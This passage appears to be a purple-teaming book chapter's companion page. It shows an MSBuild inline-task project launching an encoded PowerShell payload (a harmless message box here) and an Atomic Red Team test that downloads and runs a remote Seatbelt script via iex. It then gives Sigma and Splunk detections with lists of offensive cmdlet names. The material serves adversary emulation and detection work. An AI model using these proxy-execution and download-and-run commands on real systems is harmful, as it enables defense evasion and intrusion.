+    <span class="nt">&lt;Task&gt;</span>
+      <span class="nt">&lt;Code</span> <span class="na">Type=</span><span class="s">"Class"</span> <span class="na">Language=</span><span class="s">"cs"</span><span class="nt">&gt;</span>
+        <span class="cp">&lt;![CDATA[
+          using System;
+          using System.Diagnostics;
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+          public class AgptPowerShell : Task, ITask
+              {
+                public override bool Execute()
+                {
+                  ProcessStartInfo psi = new ProcessStartInfo()
+                  {
+                (@\wingding{3}@) FileName = "powershell.exe",
+                    Arguments = "-e QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0A YgBsAHkAIABTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAOwAgAFs AUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATQBlAHMAcwBhAG cAZQBCAG8AeABdADoAOgBTAGgAbwB3ACgAJwBNAGEAbAB3AGEAcgBlACAASQBuAHMAdABhA GwAbABlAGQAIQAnACkA",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                  };
+
+                  Process.Start(psi);
+                  return true;
+                }
+              }
+        ]]&gt;</span>
+      <span class="nt">&lt;/Code&gt;</span>
+    <span class="nt">&lt;/Task&gt;</span>
+  <span class="nt">&lt;/UsingTask&gt;</span>
+<span class="nt">&lt;/Project&gt;</span>
+</code></pre></div></div>
+<p>Decoding the encoded PowerShell command to review its content.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="nx">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">"QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYg BsAHkAIABTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAOwAgAFsA UwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATQBlAHMAcwBhAG cAZQBCAG8AeABdADoAOgBTAGgAbwB3ACgAJwBNAGEAbAB3AGEAcgBlACAASQBuAHMAdABh AGwAbABlAGQAIQAnACkA"</span><span class="p">));</span><span class="w">
+
+</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-Assembly</span><span class="w"> </span><span class="nx">System.Windows.Forms</span><span class="p">;</span><span class="w"> </span><span class="p">[</span><span class="n">System.Windows.Forms.MessageBox</span><span class="p">]::</span><span class="n">Show</span><span class="p">(</span><span class="s1">'Malware Installed!'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>The command to execute the <i>csproj</i> file using <code class="language-plaintext highlighter-rouge">MSBuild.exe</code>.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe</span><span class="w"> </span><span class="o">.</span><span class="nx">\posh.csproj</span><span class="w">
+</span></code></pre></div></div>
+<p>Listing existing atomics under the MITRE technique T1127.001.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AtomicTest</span><span class="w"> </span><span class="nt">-ShowDetailsBrief</span><span class="w"> </span><span class="nx">T1127.001</span><span class="w">
+</span><span class="n">PathToAtomicsFolder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C:\AtomicRedTeam\atomics</span><span class="w">
+
+</span><span class="n">T1127.001-1</span><span class="w"> </span><span class="nx">MSBuild</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">Inline</span><span class="w"> </span><span class="nx">Tasks</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="c">#)</span><span class="w">
+</span><span class="n">T1127.001-2</span><span class="w"> </span><span class="nx">MSBuild</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">Inline</span><span class="w"> </span><span class="nx">Tasks</span><span class="w"> </span><span class="p">(</span><span class="n">VB</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>The new <code class="language-plaintext highlighter-rouge">atomic_tests</code> key added to <code class="language-plaintext highlighter-rouge">C:\AtomicRedTeam\atomics\T1127.001\T1127.001.yml</code> for the above <i>csproj</i> technique.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">attack_technique</span><span class="pi">:</span> <span class="s">T1127.001</span>
+<span class="na">display_name</span><span class="pi">:</span> <span class="s1">'</span><span class="s">Trusted</span><span class="nv"> </span><span class="s">Developer</span><span class="nv"> </span><span class="s">Utilities</span><span class="nv"> </span><span class="s">Proxy</span><span class="nv"> </span><span class="s">Execution:</span><span class="nv"> </span><span class="s">MSBuild'</span>
+<span class="na">atomic_tests</span><span class="pi">:</span>    
+<span class="s">--snip--</span>
+<span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">MSBuild PowerShell Execution Using Inline Tasks (C#)</span>
+  <span class="na">auto_generated_guid</span><span class="pi">:</span> 
+  <span class="na">description</span><span class="pi">:</span> <span class="pi">|</span>
+    <span class="s">Executes the code in a project file using msbuild.exe. This code spawns a PowerShell encoded command that displays a message box.</span>
+  <span class="na">supported_platforms</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="s">windows</span>
+  <span class="na">input_arguments</span><span class="pi">:</span>
+    <span class="na">filename</span><span class="pi">:</span>
+      <span class="na">description</span><span class="pi">:</span> <span class="s">Location of the project file</span>
+      <span class="na">type</span><span class="pi">:</span> <span class="s">path</span>
+      <span class="na">default</span><span class="pi">:</span> <span class="s">PathToAtomicsFolder\T1127.001\src\psh.csproj</span>
+    <span class="na">msbuildpath</span><span class="pi">:</span>
+      <span class="na">description</span><span class="pi">:</span> <span class="s">Default location of MSBuild</span>
+      <span class="na">type</span><span class="pi">:</span> <span class="s">path</span>
+      <span class="na">default</span><span class="pi">:</span> <span class="s">C:\Windows\Microsoft.NET\Framework\v4.0.30319</span>
+    <span class="na">msbuildname</span><span class="pi">:</span>
+      <span class="na">description</span><span class="pi">:</span> <span class="s">Default name of MSBuild</span>
+      <span class="na">type</span><span class="pi">:</span> <span class="s">path</span>
+      <span class="na">default</span><span class="pi">:</span> <span class="s">msbuild.exe</span>
+  <span class="na">dependency_executor_name</span><span class="pi">:</span> <span class="s">powershell</span>
+  <span class="na">dependencies</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">description</span><span class="pi">:</span> <span class="pi">|</span>
+      <span class="s">Project file must exist on disk at specified location (#{filename})</span>
+    <span class="na">prereq_command</span><span class="pi">:</span> <span class="pi">|</span>
+      <span class="s">if (Test-Path "#{filename}") {exit 0} else {exit 1}</span>
+    <span class="na">get_prereq_command</span><span class="pi">:</span> <span class="pi">|</span>
+      <span class="s">New-Item -Type Directory (split-path "#{filename}") -ErrorAction ignore | Out-Null</span>
+      <span class="s">Invoke-WebRequest "https://aguidetopurpleteaming.com/resources/8/psh.csproj" -OutFile "#{filename}"</span>
+  <span class="na">executor</span><span class="pi">:</span>
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">|</span>
+      <span class="s">#{msbuildpath}\#{msbuildname} "#{filename}"</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s">command_prompt</span>
+</code></pre></div></div>
+<p>With the YAML file updated, the following commands list and fetch the pre-requisites for executing the atomic.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Tools&gt; Invoke-AtomicTest -CheckPrereqs  T1127.001-3
+Prerequisites not met: T1127.001-3 MSBuild PowerShell Execution Using Inline Tasks (C#)
+    [*] Project file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1127.001\src\psh.csproj)
+
+Try installing prereq's with the -GetPrereqs switch
+
+PS C:\Tools&gt; Invoke-AtomicTest -GetPrereqs T1127.001-3
+Prereq successfully met: Project file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1127.001\src\psh.csproj)
+</code></pre></div></div>
+<h4 id="simulating-malicious-script-execution">Simulating Malicious Script Execution</h4>
+<p>Executing an atomic test for T1082 that leverages PowerSharpPack to launch the SeatBelt tool for situational awareness.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\AtomicRedTeam&gt; Invoke-AtomicTest T1082 -TestNames 'WinPwn - PowerSharpPack - Seatbelt' -ShowDetails
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+[********BEGIN TEST*******]
+Technique: System Information Discovery T1082
+Atomic Test Name: WinPwn - PowerSharpPack - Seatbelt
+Atomic Test Number: 23
+Atomic Test GUID: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
+Description: PowerSharpPack - Seatbelt technique via function of WinPwn.
+[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
+
+Attack Commands:
+Executor: powershell
+ElevationRequired: False
+Command:
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/aguidetopurpleteaming/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
+Invoke-Seatbelt -Command "-group=all"
+[!!!!!!!!END TEST!!!!!!!]
+</code></pre></div></div>
+<p>A command that chains both the <i>csproj</i> atomic with the above SeatBelt atomic.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AtomicRedTeam</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AtomicTest</span><span class="w"> </span><span class="nx">T1127.001</span><span class="w"> </span><span class="nt">-TestNames</span><span class="w"> </span><span class="s1">'MSBuild PowerShell Execution Using Inline Tasks (C#)'</span><span class="p">;</span><span class="w"> </span><span class="n">Invoke-AtomicTest</span><span class="w"> </span><span class="nx">T1082</span><span class="w"> </span><span class="nt">-TestNames</span><span class="w"> </span><span class="s1">'WinPwn - PowerSharpPack - Seatbelt'</span><span class="p">;</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="defending-against-the-attack">Defending Against the Attack</h4>
+<h5 id="capturing-parent-child-process-relationships">Capturing Parent-Child Process Relationships</h5>
+<p>A good example of leveraging parent-child relationships for detecting web shells.</p>
+<table>
+ <tbody>
+   <tr>
+     <td>Sourced from: <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/626a6fc6e3dc29b3d18155271b63465eb154d854/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml">https://github.com/SigmaHQ/sigma/blob/626a6fc6e3dc29b3d18155271b63465eb154d854/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml</a></td>
+   </tr>
+ </tbody>
+</table>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">title</span><span class="pi">:</span> <span class="s">Linux Webshell Indicators</span>
+<span class="na">id</span><span class="pi">:</span> <span class="s">818f7b24-0fba-4c49-a073-8b755573b9c7</span>
+<span class="na">status</span><span class="pi">:</span> <span class="s">test</span>
+<span class="na">description</span><span class="pi">:</span> <span class="s">Detects suspicious sub processes of web server processes</span>
+<span class="na">references</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/</span>
+    <span class="pi">-</span> <span class="s">https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF</span>
+<span class="na">author</span><span class="pi">:</span> <span class="s">Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)</span>
+<span class="na">date</span><span class="pi">:</span> <span class="s">2021/10/15</span>
+<span class="na">modified</span><span class="pi">:</span> <span class="s">2022/12/28</span>
+<span class="na">tags</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">attack.persistence</span>
+    <span class="pi">-</span> <span class="s">attack.t1505.003</span>
+<span class="na">logsource</span><span class="pi">:</span>
+    <span class="na">product</span><span class="pi">:</span> <span class="s">linux</span>
+    <span class="na">category</span><span class="pi">:</span> <span class="s">process_creation</span>
+<span class="na">detection</span><span class="pi">:</span>
+    <span class="na">selection_general</span><span class="pi">:</span>
+        <span class="na">ParentImage|endswith</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/httpd'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/lighttpd'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/nginx'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/apache2'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/node'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/caddy'</span>
+    <span class="na">selection_tomcat</span><span class="pi">:</span>
+        <span class="na">ParentCommandLine|contains|all</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/bin/java'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">tomcat'</span>
+    <span class="na">selection_websphere</span><span class="pi">:</span>  <span class="c1"># ? just guessing</span>
+        <span class="na">ParentCommandLine|contains|all</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/bin/java'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">websphere'</span>
+    <span class="na">sub_processes</span><span class="pi">:</span>
+        <span class="na">Image|endswith</span><span class="pi">:</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/whoami'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/ifconfig'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/ip'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/bin/uname'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/bin/cat'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/bin/crontab'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/hostname'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/iptables'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/netstat'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/pwd'</span>
+            <span class="pi">-</span> <span class="s1">'</span><span class="s">/route'</span>
+    <span class="na">condition</span><span class="pi">:</span> <span class="s">1 of selection_* and sub_processes</span>
+<span class="na">falsepositives</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">Web applications that invoke Linux command line tools</span>
+<span class="na">level</span><span class="pi">:</span> <span class="s">high</span>
+</code></pre></div></div>
+<p>A diagram of the parent-child relationship between <code class="language-plaintext highlighter-rouge">MSBuild.exe</code> and <code class="language-plaintext highlighter-rouge">powershell.exe</code>.</p>
+<figure>
+<img src="/assets/images/8/detection-0.png" style="width: 75%" title="Figure 8-5" />
+<figcaption>Figure 8-5: The parent-child relationship between MSBuild and an encoded PowerShell command</figcaption>
+</figure>
+<p>A Splunk query for evaluating the most common processes spawned by <code class="language-plaintext highlighter-rouge">MSBuild.exe</code>.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="p">"</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span>
+<span class="nv">ParentImage</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">msbuild.exe</span><span class="p">"</span>
+<span class="o">|</span> <span class="nv">stats</span> <span class="nv">count</span> <span class="nv">by</span> <span class="nv">Image</span>
+<span class="o">|</span> <span class="nb">sort</span> <span class="o">-</span><span class="nv">count</span>
+</code></pre></div></div>
+<p>A refined query that factors parent and child command-line arguments into the assessment of commonality.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="p">"</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span>
+<span class="nv">ParentImage</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">msbuild.exe</span><span class="p">"</span>
+<span class="o">|</span> <span class="nv">stats</span> <span class="nv">count</span> <span class="nv">by</span> <span class="nv">ParentCommandLine</span><span class="p">,</span> <span class="nv">Image</span><span class="p">,</span> <span class="nv">CommandLine</span>
+<span class="o">|</span> <span class="nb">sort</span> <span class="o">-</span><span class="nv">count</span>
+</code></pre></div></div>
+<p>A comparable query that leverages Windows process-tracking audit logs (event ID 4688) rather than Sysmon logs.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="nv">Security</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">4688</span>
+<span class="nv">ParentProcessName</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">msbuild.exe</span><span class="p">"</span>
+<span class="o">|</span> <span class="nv">stats</span> <span class="nv">count</span> <span class="nv">by</span> <span class="nv">NewProcessName</span>
+<span class="o">|</span> <span class="nb">sort</span> <span class="o">-</span><span class="nv">count</span>
+</code></pre></div></div>
+<h5 id="creating-splunk-alerts">Creating Splunk Alerts</h5>
+<p>A Splunk SPL query that detects instances of <code class="language-plaintext highlighter-rouge">MSBuild.exe</code> spawning <code class="language-plaintext highlighter-rouge">powershell.exe</code>.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="p">"</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span>
+<span class="nv">ParentImage</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">msbuild.exe</span><span class="p">"</span>
+<span class="nv">Image</span><span class="o">=</span><span class="p">"</span><span class="s2">*</span><span class="se">\\</span><span class="s2">powershell.exe</span><span class="p">"</span>
+</code></pre></div></div>
+<h5 id="viewing-suspicious-script-content">Viewing Suspicious Script Content</h5>
+<p>Splunk SPL that stitches PowerShell Script Block logging entries together to view entire scripts</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-PowerShell/Operational</span><span class="p">"</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">4104</span>
+<span class="o">|</span> <span class="nb">sort</span> <span class="mi">0</span> <span class="nv">ScriptBlockId</span><span class="p">,</span> <span class="nv">MessageNumber</span>
+<span class="o">|</span> <span class="nv">stats</span> <span class="nv">list</span><span class="p">(</span><span class="nv">ScriptBlockText</span><span class="p">)</span> <span class="nv">as</span> <span class="nv">Script</span><span class="p">,</span> <span class="nv">min</span><span class="p">(</span><span class="nv">_time</span><span class="p">)</span> <span class="nv">as</span> <span class="nv">_time</span><span class="p">,</span> <span class="nv">first</span><span class="p">(</span><span class="nv">Computer</span><span class="p">)</span> <span class="nv">as</span> <span class="nv">Computer</span> <span class="nv">by</span> <span class="nv">ScriptBlockId</span>
+<span class="o">|</span> <span class="nb">eval</span> <span class="nv">Script</span><span class="o">=</span><span class="nv">mvjoin</span><span class="p">(</span><span class="nv">Script</span><span class="p">,</span> <span class="p">"")</span>
+<span class="o">|</span> <span class="nv">search</span> <span class="nv">Script</span><span class="o">=</span><span class="nv">*seatbelt</span><span class="o">*</span>
+<span class="o">|</span> <span class="nv">table</span> <span class="nv">_time</span><span class="p">,</span> <span class="nv">Computer</span><span class="p">,</span> <span class="nv">ScriptBlockId</span><span class="p">,</span> <span class="nv">Script</span>
+</code></pre></div></div>
+<p>A Splunk query that looks for suspicious names of PowerShell cmdlets in Script Block logs.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-PowerShell/Operational</span><span class="p">"</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">4104</span>
+<span class="nv">ScriptBlockText</span> <span class="nv">IN</span> <span class="p">(</span>
+    <span class="p">"</span><span class="s2">*Invoke-Seatbelt*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*Invoke-PPLDump*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*Invoke-Rubeus*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*Invoke-SCShell*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*Invoke-SafetyKatz*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*Invoke-SharpGPOAbuse*</span><span class="p">",</span>
+    <span class="o">--</span><span class="nv">snip</span><span class="o">--</span>
+<span class="p">)</span>
+</code></pre></div></div>
+<p>A similar query based on <a href="https://github.com/SigmaHQ/sigma/blob/1a85bc5b5a88253a35e63e23cf603090d93d59c4/rules/windows/powershell/powershell_script/posh_ps_susp_keywords.yml">this Sigma rule</a> that looks for suspicious PowerShell functions being used for .NET reflection.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span>
+<span class="nv">Channel</span><span class="o">=</span><span class="p">"</span><span class="s2">Microsoft-Windows-PowerShell/Operational</span><span class="p">"</span>
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">4104</span>
+<span class="nv">ScriptBlockText</span> <span class="nv">IN</span> <span class="p">(</span>
+    <span class="p">"</span><span class="s2">*System.Reflection.Assembly.Load($*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*[System.Reflection.Assembly]::Load($*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*[Reflection.Assembly]::Load($*</span><span class="p">",</span>
+    <span class="p">"</span><span class="s2">*System.Reflection.AssemblyName*</span><span class="p">",</span>
+    <span class="o">--</span><span class="nv">snip</span><span class="o">--</span>
+<span class="p">)</span>
+</code></pre></div></div>
+<hr />
+<h2 id="resources">Resources</h2>
+<p>The following resources expand on topics covered in this chapter.
+<br />
+<br /></p>
+<h4 id="living-off-the-land-attacks">Living-off-the-Land Attacks</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A community-supported library of Windows Living Off The Land binaries and scripts</h6>
+               <p><i>"LOLBAS," accessed May 6, 2024</i></p>
+                <a target="_blank" href="https://lolbas-project.github.io/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A Linux-focused library of Living Off The Land techniques</h6>
+               <p><i>"GTFOBins," accessed May 6, 2024</i></p>
+                <a target="_blank" href="https://gtfobins.github.io/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A library of Living Off The Land techniques targeting the Apple macOS operating system</h6>
+               <p><i>"LOOBins," accessed May 6, 2024</i></p>
+                <a target="_blank" href="https://www.loobins.io/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>An example of DarkGate malware abusing AutoHotKey and Windows LOLBAS to achieve infection</h6>
+               <p><i>"delivr.to," accessed May 6, 2024</i></p>
+                <a target="_blank" href="https://delivr.to/?id=e3d89f22-df99-4693-b788-03022288ec43" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="capturing-parent-child-process-relationships-1">Capturing Parent-Child Process Relationships</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A Sigma rule for the detection of suspicious child process spawning from Linux web server parent processes</h6>
+               <p><i>"proc_creation_lnx_webshell_detection," accessed October 06, 2024</i></p>
+                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/626a6fc6e3dc29b3d18155271b63465eb154d854/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Various techniques for operating in an EDR-monitored environment including spoofing parent process IDs and command line arguments, notably thwarting detections based on parent-child relationships</h6>
+               <p><i>William Burgess, "Red teaming in an EDR age," Wild West Hacking Fest, November 2018</i></p>
+                <a target="_blank" href="https://youtu.be/l8nkXCOYQC4" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Detection of parent process ID spoofing using Event Tracing for Windows</h6>
+               <p><i>Noora Hyvärinen, "Detecting Parent PID Spoofing," F-Secure, December 21, 2018</i></p>
+                <a target="_blank" href="https://blog.f-secure.com/detecting-parent-pid-spoofing/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="viewing-suspicious-script-content-1">Viewing Suspicious Script Content</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A Sigma rule for the detection of suspicious PowerShell cmdlets, including those relating to .NET reflection</h6>
+               <p><i>"posh_ps_susp_keywords," accessed October 06, 2024</i></p>
+                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/1a85bc5b5a88253a35e63e23cf603090d93d59c4/rules/windows/powershell/powershell_script/posh_ps_susp_keywords.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Bypassing Script Block Logging and suspicious strings</h6>
+               <p><i>Adam Chester, "Exploring PowerShell AMSI and Logging Evasion," MDSec, June, 2018</i></p>
+                <a target="_blank" href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>More examples of hunting for suspicious content in Script Block Logging output</h6>
+               <p><i>Splunk Threat Research Team, "Hunting for Malicious PowerShell using Script Block Logging," Splunk, September 17, 2021</i></p>
+                <a target="_blank" href="https://www.splunk.com/en_us/blog/security/hunting-for-malicious-powershell-using-script-block-logging.html" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="going-beyond">Going Beyond</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Executing attacks with Leonidas and purple teaming environments to develop attack detection capability</h6>
+               <p><i>Alfie Champion and Nick Jones, "Beyond Public Buckets: Lessons Learned on Attack Detection in the Cloud," RSA Conference, May, 2021</i></p>
+                <a target="_blank" href="https://youtu.be/YvpzUpOsY7c" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Performing purple team exercises targeting Kubernetes infrastructure using Leonidas</h6>
+               <p><i>Leo Tsaousis, "DEF CON 32 - Kubernetes Attack Simulation: The Definitive Guide," Def Con 32, accessed November 22, 2024</i></p>
+                <a target="_blank" href="https://www.youtube.com/watch?v=PFeqxSD7Gh8" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>The release blog for Stratus Red Team, outlining functionality and design philosophy</h6>
+               <p><i>Christophe Tafani-Dereeper, "Introducing Stratus Red Team, an Adversary Emulation Tool for the Cloud," January 28, 2022</i></p>
+                <a target="_blank" href="https://blog.christophetd.fr/introducing-stratus-red-team-an-adversary-emulation-tool-for-the-cloud/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<div class="container">
+ <div class="row">
+   <div class="col" style="text-align: left">
+      <a href="/part-II/network-traffic-and-event-tracing/" class="btn btn-primary">&lt;&lt; Chapter 7</a>
+   </div>
+   <div class="col" style="text-align: right">
+      <a href="/part-II/ad-recon-with-mitre-caldera/" class="btn btn-primary">Chapter 9 &gt;&gt;</a>
+   </div>
+ </div>
+</div>
+			</article>
+		</div>
+	</main>
+		<!-- Footer -->
+ <footer class="footer-chulapa text-center mt-0 pt-3">
+   <div class="container">
+     <div class="row">
